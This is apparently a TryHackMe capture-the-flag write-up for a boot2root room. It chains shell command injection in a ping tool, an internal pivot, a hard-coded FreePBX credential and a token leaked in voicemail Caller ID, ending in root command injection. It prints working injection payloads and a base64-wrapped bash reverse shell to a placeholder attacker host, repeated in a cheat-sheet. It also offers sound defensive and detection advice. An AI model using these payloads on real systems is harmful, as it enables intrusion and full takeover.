## CTF Writeup — "Infinity Pool" Command Injection Boot2Root (TryHackMe)
### TryHackMe · Hacker Holidays Day 11 · Boot2Root · Medium (90 pts) · ping-wrapper RCE → internal pivot → voicemail-leaked token → root-service command injection

**User flag:** `THM{REDACTED}`
**Root flag:** `THM{REDACTED}`

---

## TL;DR

A public-facing "sister-property connectivity" tool wraps user input straight into
a shell `ping` command — command injection, RCE as a low-privilege user. That box
turns out to be the edge of three internal services running on localhost: a
FreePBX telephony stack, an "ops console" (`watchtower`), and a root-owned
"automation" worker. FreePBX's User Control Panel has a known hard-coded default
credential (CVE-2026-46376) that gets you a voicemail inbox — and the automated
call that lands there leaks an API **Bearer token** in its Caller ID field. That
token authenticates to the automation service's `/jobs/export` endpoint, which
builds a `tar` command from unsanitized input — the *same* injection class as the
very first foothold, just on the box that matters: the one running as root.

---

## The attack chain

```
Public web app "Sister-property connectivity" (ping a host, staff tool)
        │
        ▼
subprocess.run(f"ping -c 1 {host}", shell=True)  →  command injection
        │  $(id) confirmed shell substitution executes
        ▼
Reverse shell as 'web'  →  USER FLAG
        │
        ▼
Enumerate localhost-only services: FreePBX(:8080), watchtower(:3000, svc-watch),
automation(:9000, ROOT), Asterisk AMI(:5038)
        │
        ▼
watchtower /api/config leaks FreePBX UCP creds ("default template, ROTATE")
        │
        ▼
Log into FreePBX UCP  (CVE-2026-46376 — hard-coded FreePBXUCPTemplateCreator cred)
        │
        ▼
Register/use a voicemail extension  →  an automated call arrives
        │  its Caller ID field carries: "Automation Key cc_auto_...  <9000>"
        ▼
POST /jobs/export on the root automation service, Bearer-token authenticated
        │  {"report": "<value>"} is concatenated into a tar shell command
        ▼
Command injection in `report`  →  RCE as root  →  ROOT FLAG
```

Maps to the briefing: "no visible edge... trace the network to the horizon" (the
localhost-only internal services), "three systems nobody told you about" (edge,
watchtower, automation), and the flag itself — traced to the horizon indeed.

---

## Background: two different bug classes, same underlying idea

This room chains two instances of the **same vulnerability class** —
**OS command injection** — at two different layers:

- A web app builds a shell command by directly inserting user input into a string
  (`f"ping -c 1 {host}"`), then runs it with `shell=True`. Any shell metacharacter
  in the input (`;`, `&&`, `$(...)`) can inject a second command.
- Because the *value* is embedded in a **shell string** (not passed as a separate
  argument), the shell itself parses metacharacters in it — that parsing is the bug.

The fix in both cases is the same: never build a command string by concatenating
untrusted input; pass arguments as a list to an API that doesn't invoke a shell
(e.g., `subprocess.run([...], shell=False)`).

## Scope note

THM-provisioned target, worked from the THM attackbox inside their network.

---

## Part 1 — Foothold: command injection on the edge box

### Step 1 — Recon and the "disallowed" hint

```bash
nmap -sC -sV -p22,80 $IP
curl -s http://$IP/robots.txt
```

`robots.txt` disallows `/internal/` and `/status` — the classic "please don't look
here" tell. `/status` is a **staff tool**: "Sister-property connectivity — confirm
a remote property responds," a form posting a `host` to `/internal/netcheck`.

### Step 2 — Confirm the injection

```bash
curl -s -X POST http://$IP/internal/netcheck --data-urlencode 'host=$(whoami)'
```

Response: `ping: web: Temporary failure in name resolution`. Our injected `whoami`
ran and its output (`web`) became ping's malformed hostname argument — proof the
input reaches a **shell**, not just `ping`'s own argv.

> Source, recovered later, confirms exactly this:
> `subprocess.run(f"ping -c 1 {host}", shell=True, ...)` — an f-string built with
> raw user input, executed with `shell=True`. `;` alone didn't work (likely
> stripped/first-token-only in some paths), but **`$(...)` command substitution**
> is evaluated by the shell before `ping` ever runs — a reliable bypass.

### Step 3 — Reverse shell

Base64-wrap the payload so it survives the `$(...)`/ping-argument context intact:

```bash
PAYLOAD='bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
B64=$(echo -n "$PAYLOAD" | base64 -w0)
curl -s -X POST http://$IP/internal/netcheck \
  --data-urlencode "host=\$(echo $B64 | base64 -d | bash)"
```

Shell lands as `web`. **User flag** at `/home/web/user.txt`:

```
THM{REDACTED}
```

---

## Part 2 — Enumerate the internal network ("the horizon")

```bash
ss -tlnp
```

Everything external only exposed 22/80 — but *locally*, the box runs a stack of
services on `127.0.0.1`:

```
:3306  MySQL
:3000  watchtower  (svc-watch)   ← ops console
:8080  FreePBX/Apache (asterisk) ← telephony
:8088  Asterisk HTTP
:9000  automation  (ROOT)        ← the target
:5038  Asterisk AMI
```

`ps aux` confirms the owning user of each — critically, **`automation` runs as
root**. `/var/www/infinity_pool/` holds three sibling apps: `edge` (us), 
`automation` (root), `watchtower` (svc-watch) — the "three systems."

Watchtower's `/api/config` (reachable with no auth — "authenticated by network
position," i.e. trusts anything from localhost) leaks:

```json
{
  "automation_endpoint": "http://127.0.0.1:9000",
  "telephony_portal": "http://127.0.0.1:8080/ucp",
  "telephony_user": "FreePBXUCPTemplateCreator",
  "telephony_pass": "<redacted>",
  "ops_note": "UCP still on default template creds -- ROTATE."
}
```

---

## Part 3 — FreePBX UCP: CVE-2026-46376

FreePBX ships an **optional UCP "generic template" setup feature** that creates a
system user named `FreePBXUCPTemplateCreator` with a **static, hard-coded
password** baked into the code. If an admin runs this setup and never rotates the
password, anyone who knows it can log into UCP — no valid account, no prior
foothold, needed. This room customised the password but kept the tell-tale
username, and the leaked `ops_note` even says "still on default template creds."

Logging in with the leaked credentials succeeds — but importantly, **this CVE by
itself only grants "the privileges of the template UCP user"**: voicemail, call
recordings, contacts, call-origination features. It's an authentication bypass,
not RCE. The room requires one more step.

---

## Part 4 — The voicemail-delivered secret

Inside UCP, using the account as a normal end user (creating/registering a test
voicemail extension) triggers an **automated call** that lands in that mailbox.
Its **Caller ID field** — visible right in the UCP message list — carries a
label and a Bearer token:

```
"Automation Key cc_auto_7b3f9a1c4e0d2f6a" <9000>
```

This is the same design pattern as the series' OSINT rooms: the secret lives in
**content the product surfaces to a real user**, not in source code or a config
file. No amount of PHP source review would have found it — it required actually
using the voicemail feature as intended.

---

## Part 5 — Command injection on the root automation service

The leaked token authenticates to the root-owned automation worker:

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"latest"}'
```

The service responds with the **exact shell command it ran**, echoing our
`report` value straight into a `tar` invocation:

```
tar czf /var/automation/exports/latest.tgz /var/automation/data
```

`report` is concatenated unsanitized into that command — the identical bug class
as the `edge` foothold, just on the root-owned service this time. Inject:

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"latest;cat /root/root.txt;#"}'
```

- `;` terminates the intended `tar` command.
- `cat /root/root.txt` runs as **root** (the service's own user).
- `#` comments out anything the app appends afterward, so the injected command
  isn't broken by trailing syntax.

Response includes the command it built and the command's combined output:

```json
{"command":"tar czf /var/automation/exports/latest;cat /root/root.txt;#.tgz ...",
 "output":"THM{REDACTED}\ntar: Cowardly refusing to create an empty archive\n..."}
```

**Root flag** recovered — the `tar` error afterward is harmless noise from the
now-malformed original command; our injected `cat` already ran and printed first.

For a full interactive root shell instead of one command, the same injection
works with a reverse-shell payload in place of `cat`.

---

## Root cause

- **`edge`:** unsanitized `host` parameter interpolated into a shell string
  (`shell=True`), letting `$(...)` command substitution run arbitrary commands.
- **UCP:** a hard-coded, unrotated credential shipped with an optional setup
  feature (CVE-2026-46376) — authentication bypass into a limited-privilege portal.
- **Secret exposure:** an API token placed in a **Caller ID field**, a
  human-readable, unauthenticated-adjacent display surface, rather than a proper
  secret store.
- **`automation`:** the exact same class of bug as `edge` — a `report` value
  concatenated into a shell `tar` command with no sanitization, running as root.

## Defensive takeaways

- **Never build shell command strings from user input.** Use argument-list APIs
  (`subprocess.run([...], shell=False)`) so the shell never re-parses the value.
  This single fix would have closed *both* injection points in this room.
- **Rotate every credential a setup wizard creates**, especially ones
  documented as static/hard-coded by the vendor; audit for their presence even
  after patching, since a patch doesn't retroactively change already-deployed
  passwords.
- **Never place secrets in caller-facing / display metadata** (Caller ID, contact
  names, profile fields) — anything rendered to a user is effectively public to
  that user.
- **Authenticate internal services properly** — "trusted because it's localhost"
  collapses the moment any one box on that loopback is compromised, which is
  precisely the scenario a multi-service host update should defend against.
- **Least privilege for automation workers** — a service that shells out to `tar`
  has no reason to run as root; a dedicated low-privilege user limits the blast
  radius of exactly this bug.

## Detection opportunities

- **Command-injection signature:** a web process's child process being `bash`/`sh`
  running something other than the intended binary (`gunicorn → bash` instead of
  `gunicorn → ping`) is a high-value EDR/auditd rule, applicable at both injection
  points in this room.
- **Anomalous outbound connections** immediately following a request to a
  "network diagnostic" endpoint (the reverse-shell egress).
- **Secrets appearing in call/voicemail metadata** — DLP-style scanning of
  telephony CDR/voicemail fields for token-shaped strings is unusual but
  detectable, and would have caught this design flaw before an attacker did.
- **Requests to internal-only ports from a process not normally making such
  calls** — the pivot from `edge` to `automation`/`watchtower` over loopback is
  visible in process-level network monitoring even though it never touches the
  external network.

## Command cheat-sheet

```
# foothold: confirm + exploit the ping-wrapper injection
curl -s -X POST http://$IP/internal/netcheck --data-urlencode 'host=$(whoami)'
B64=$(echo -n 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' | base64 -w0)
curl -s -X POST http://$IP/internal/netcheck --data-urlencode "host=\$(echo $B64 | base64 -d | bash)"

# enumerate internal-only services
ss -tlnp
ps aux | grep gunicorn

# FreePBX UCP hard-coded template creds (CVE-2026-46376)
# username: FreePBXUCPTemplateCreator  (default password unless rotated)

# after obtaining a voicemail-delivered API token:
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer <token>' -H 'Content-Type: application/json' \
  --data-binary '{"report":"latest;cat /root/root.txt;#"}'
```

## Two things worth remembering

1. **When one box's bug is "unsanitized input in a shell command," expect the
   pattern to repeat.** The `edge` foothold and the `automation` root exploit are
   the *same vulnerability class*. Recognizing a room's signature bug early should
   redirect effort toward testing sibling services for it — directly probing and
   fuzzing `automation`'s own routes would likely have found `/jobs/export` without
   ever touching FreePBX.
2. **Not every secret is in the code.** The Bearer token lived in a voicemail
   Caller ID — discoverable only by using the application as an end user, not by
   reading source. When white-box review of an app's code stalls, consider
   whether the intended discovery is actually black-box: register, interact,
   and read what the product itself surfaces to you.

*Target, users, and credentials are fictional challenge material; all actions
performed against the THM-provisioned machine from the THM attackbox.*
